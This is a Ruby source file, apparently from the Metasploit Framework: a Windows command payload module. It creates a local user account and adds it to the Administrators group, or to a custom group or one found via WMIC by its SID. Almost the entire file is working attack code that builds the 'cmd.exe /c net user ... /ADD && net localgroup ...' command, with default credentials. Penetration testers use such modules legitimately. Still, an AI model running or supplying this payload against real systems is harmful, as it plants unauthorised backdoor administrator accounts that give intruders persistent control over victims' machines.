# $Id$

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

    include Msf::Payload::Single
    include Msf::Sessions::CommandShellOptions

    def initialize(info = {})
        super(merge_info(info,
            'Name'        => 'Windows Execute net user /ADD CMD',
            'Version'     => '$Revision$',
            'Description' => 'Create a new user and add them to local administration group',
            'Author'      => ['hdm','scriptjunkie','Chris John Riley'],
            'License'     => MSF_LICENSE,
            'Platform'    => 'win',
            'Arch'        => ARCH_CMD,
            'Handler'     => Msf::Handler::None,
            'Session'     => Msf::Sessions::CommandShell,
            'PayloadType' => 'cmd',
            'Payload'     =>
                {
                    'Offsets' => { },
                    'Payload' => ''
                }
            ))

        register_options(
            [
                OptString.new('USER',   [ true, "The username to create",     "metasploit" ]),
                OptString.new('PASS',   [ true, "The password for this user", "metasploit" ]),
                OptString.new('CUSTOM', [ false, "Custom group name to be used instead of default", '' ]),
                OptBool.new('WMIC',     [ true, "Use WMIC on the target system to find the name of the local administrators group", false ]),
            ], self.class)
    end

    def generate
        return super + command_string
    end

    def command_string
        user = datastore['USER'] || 'metasploit'
        pass = datastore['PASS'] || ''
        cust = datastore['CUSTOM'] || ''
        wmic = datastore['WMIC']

        if(pass.length > 14)
            raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
        end

        #
        # Check if the PASS parameter meets commonly used complexity requirements and inform the user (no blocking implemented)
        #
        if(pass =~ /\A^.*((?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[\d\W])).*$/)
            print_status("Password passes complexity requirements")
        else
            print_error("Password failed complexity requirements, this command may fail on systems that require complex passwords")
        end

        if not cust.empty?
            print_status("Using custom group name #{cust}")
            return "cmd.exe /c net user #{user} #{pass} /ADD && " +
                "net localgroup \"#{cust}\" #{user} /ADD"
        elsif wmic
            print_status("Using WMIC to discover the administrative group name")
            return "cmd.exe /c \"FOR /F \"usebackq skip=1\" %g IN (`wmic group where sid^='S-1-5-32-544' get name`)\"; do " +
                "net user #{user} #{pass} /ADD && "+
                "net localgroup %g #{user} /ADD"
        else
            return "cmd.exe /c net user #{user} #{pass} /ADD && " +
                "net localgroup Administrators #{user} /ADD"
        end
    end
end
